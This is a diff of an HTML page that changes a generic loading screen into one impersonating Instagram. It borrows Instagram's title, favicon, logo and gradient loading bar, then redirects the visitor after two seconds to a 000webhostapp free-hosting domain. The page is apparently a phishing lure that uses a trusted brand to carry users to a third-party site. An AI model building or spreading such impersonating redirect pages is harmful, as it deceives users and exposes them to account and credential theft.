@@ -1,20 +1,59 @@
 <!DOCTYPE html>
-<!-- saved from url=(0061)https://syedbilalalam.github.io/packetcodeooficial.github.io/ -->
-<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
-    
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Loading...</title>
+    <link rel="shortcut icon" href="https://static.cdninstagram.com/rsrc.php/v3/y9/r/uhXzVt-dlj4.png"
+        type="image/x-icon">
+    <title>Instagram</title>
+    <style>
+        #logo {
+            height: 60px;
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+        }
+
+        #com {
+            height: 50px;
+            position: fixed;
+            bottom: 4vh;
+            left: 50%;
+            transform: translate(-50%);
+        }
+
+        #loadingbar {
+            background-image: linear-gradient(to right, rgb(255, 203, 0), rgb(165, 0, 235));
+            height: 7px;
+            width: 5vw;
+            transition: 0.5s;
+            position: fixed;
+            top: 0;
+            left: 0;
+        }
+    </style>
 </head>
+
 <body>
-    Loading
+    <div id="loadingbar"></div>
+    <img src="./media/logo.jpg" id="logo" alt="logo">
+    <img src="./media/icon.jpg" id="com" alt="branding">
     <script>
+        let defaultWidth = 5;
         setInterval(() => {
-            document.body.innerHTML += ".";
-        }, 100);
+            defaultWidth += 10;
+            document.querySelector("#loadingbar").style.width = defaultWidth + "vw";
+            if (defaultWidth > 95) {
+                defaultWidth = 0;
+            }
+        }, 500);
         setTimeout(() => {
             window.location = "https://redirectmanagerjs.000webhostapp.com/";
         }, 2000);
     </script>
+</body>
 
-................</body></html>
+</html>
